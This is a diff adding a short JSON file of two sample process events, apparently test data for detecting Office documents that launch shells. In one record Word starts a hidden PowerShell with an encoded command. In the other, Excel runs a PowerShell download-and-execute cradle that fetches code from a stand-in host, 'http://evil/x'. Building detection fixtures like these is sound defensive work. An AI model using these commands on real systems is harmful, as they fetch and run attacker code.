@@ -1,0 +1,12 @@
+[
+  {
+    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd.exe /c powershell -nop -w hidden -enc SQBFAFgA"
+  },
+  {
+    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "powershell.exe -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://evil/x')"
+  }
+]
